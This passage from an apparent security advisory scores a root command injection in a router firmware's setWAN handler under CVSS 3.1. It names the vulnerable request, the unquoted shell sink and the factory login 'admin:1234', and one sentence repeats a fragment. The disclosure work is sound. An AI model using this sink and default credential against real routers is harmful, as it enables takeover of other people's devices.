Base = min(1.08 * (6.128026 + 2.286496), 10) = 1.08 * 8.414522 = 9.087684
Roundup                                        = 9.1
```

The Scope-Changed privilege weight for `PR:H` is 0.50 rather than 0.27, which alone
accounts for most of the increase. It is printed so a reader who prefers the Changed
convention can see what it would buy; it is not the score of this finding.

### CWE and CVSS — the Attack Vector decision

`AV:N` (published): the service is bound to the device's IP stack on TCP port 80, and the
set of possible attackers is not limited to hosts sharing one physical medium - any wired
client, associated wireless client, bridged device, or host reachable through routing or a
VPN can address it. Two ordinary operator decisions (remote management, a port forward) put
it on the internet.

`AV:A` (rejected for the headline, arithmetic printed): a stock device drops WAN-originated
new connections (`firewall.sh:180`, `firewall.sh:187`, `firewall.sh:189`), so the attacker
must already be on the attached LAN or Wi-Fi segment.

```
Exploitability(AV:A, AC:L, PR:H) = 8.22 * 0.62 * 0.77 * 0.27 * 0.85 = 0.900610
Base = min(5.873119 + 0.900610, 10)                                 = 6.773729
Roundup                                                             = 6.8
```

We publish 7.2 rather than 6.8 because that firewall posture is a shell-script side effect
rather than a documented management-plane decision, and because the segment behind a SOHO
router is where untrusted devices live. A reader who disagrees has the alternative number;
the two readings differ by 0.4.

`CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` = 6.6 High (Exploitability 8.22 x 0.85 x
0.44 x 0.27 x 0.85 = 0.705547, base 6.578666) is likewise rejected: nothing about success
depends on a condition outside the attacker's control. The device's four uptime-gated
routes do carry such a condition and are not part of this advisory.

### CWE and CVSS — conditional readings, labelled as such

**Conditional A - the factory credential was never rotated.**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 Critical.

```
Exploitability(PR:N) = 8.22 * 0.85 * 0.77 * 0.85 * 0.85 = 3.887043
Base = min(5.873119 + 3.887043, 10)                      = 9.760161
Roundup                                                  = 9.8
```

Where a device still accepts the credential the firmware ships with, the administrator
privilege costs one guess and no privilege has to be obtained. Its Scope-Changed variant
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` computes to 10.0 and is not published, for
the Scope reason above. **Status: reasoned, not demonstrated.** We never authenticated to a
device, so this rests on the shipped password file in the read-only root filesystem plus the
injection proven at the sink. The credential weakness itself stands on the artefact, not on
the inference.

**Conditional B - the device is still in its pre-configuration setup state.**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 Critical, with the contested variant
`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` = 8.1 High (Exploitability 8.22 x 0.85 x
0.44 x 0.85 x 0.85 = 2.221167, base 8.094286). When configuration object `0x1bc` reads
zero, `auth_authorize` returns success with no challenge for any path outside `/mp.asp`,
`/index.asp` and `/` (at `0x4052d0`) and answers `/generate_204` with `204`. **Status:
structural inference from the shipped binary, never exercised.** We do not adopt it: the
state is the install wizard, it is transient, and first-run provisioning is not the finding
this advisory rates. Operators should still know that a device reset to defaults and left
unconfigured is exposed in a way a configured device is not.

### CWE and CVSS — the separately reported factory credential (CWE-798)

Stated on its own terms and without a score, because scoring it here would double-count
against Conditional A above:

- The image `BR6478AC_v2.20.bin` contains a populated `/etc/boa/boa.passwd` in a read-only
  SquashFS filesystem, referenced by the single `Auth / /etc/boa/boa.passwd` directive in
  `etc/boa/boa.conf`. The realm therefore has one credential shared by every unit of this
  build, and the model's   build, and the model's published factory login is `admin:1234`. A detail worth
  stating rather than smoothing: in the image we examined the single account entry of
  that file is recorded under the name `root`, whereas the published management login
  for the model is `admin`. No device was ever authenticated against, so which user
  name the HTTP realm accepts in the field was not established. No score in this
  advisory depends on the answer, because the injection needs a credential the realm
  accepts under any name; it matters to the vendor's remediation guidance, which should
  say plainly what to change.
- The digest algorithm is MD5-crypt (`$1$`). We make no cryptographic claim about the
  digest matching any specific password: the digest string captured during analysis is
  recorded incompletely, and we do not publish a comparison we cannot recompute. The
  weakness rests on the artefact - a pre-populated, shared, read-only credential store -
  and on the widely published factory login.
- No password-change enforcement was observed in the shipped boot path, so a deployment
  that never rotates the credential keeps it valid indefinitely.
- Remediation: per-unit provisioning or a forced change on first session, a memory-hard
  digest, and rate limiting with lockout on the Basic challenge.

### CWE and CVSS — what is deliberately not published

- **No score for the unauthenticated setup-state branch.** It is Conditional B, labelled as
  an inference, and it is not the headline.
- **No score for the `wanMode` 3 and `wanMode` 6 paths.** They are reported as the same
  construction read from the same handler; only `wanMode` 2 was replicated. A single score
  for the finding would double- or triple-count if the variants were scored separately.
- **No score for the sibling model.** The BR-6208AC comparison is a static observation about
  a second image; nothing was executed against it.
- **No score for the unbounded `strcpy`.** Untested, undeveloped, unclaimed.
- **No score for the uptime-gated `/goform/mp` sink or for the LAN-only `miniigd` SOAP
  sink.** Both are reported to the vendor as observations with their limiting conditions.
- **No score that assumes internet reachability on a stock device.** The WAN-side `DROP`
  policy is in the shipped image and the `AV:A` reading is printed beside the headline.
- **No score for the excluded candidates** (`formrefresh`, `formAutoFWupgrade`,
  `formPreventionSetup`, `wscd`, `edx_cloud`); none had a request-controlled path to a
  command execution that we could establish.
- **No claim about firmware builds we did not obtain.** Only `BR6478AC_v2.20.bin` was
  examined.
- **No inherited figure.** Every number here was computed from its own vector; the recorded
  `8.8` in the research notes was not carried over.

### CWE and CVSS — summary

| Reading | Vector | Score | Severity | Status |
|---|---|---|---|---|
| **Published** | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` | **7.2** | High | a configured device, one valid administrator credential, one request |
| Conditional A | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 9.8 | Critical | factory credential never rotated; reasoned, not demonstrated |
| Conditional B | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 9.8 | Critical | device still in the setup state; structural inference, not exercised |
| Conditional B' | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | 8.1 | High | setup state present but contested; labelled conditional |
| Rejected | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | 8.8 | High | no low-privileged authenticated role exists in the product |
| Rejected | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` | 9.1 | High | Scope Changed: the service is already root, no authority is crossed |
| Rejected | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` | 6.6 | High | nothing depends on a condition outside the attacker's control |
| Alternative | `CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` | 6.8 | High | stock device, attacker confined to the attached LAN segment |

One sentence for the vendor's engineers: an authenticated administrator - the only
principal that exists on this device - can put shell grammar into the PPP, PPTP or L2TP
username of `POST /goform/setWAN`, and the product interpolates that value unquoted into
`echo %s > /tmp/UserName` and hands it to `/bin/sh -c` as root, having checked for
exactly one character beforehand. Rated 7.2 High as shipped, and 9.8 Critical wherever the
factory credential is still live.
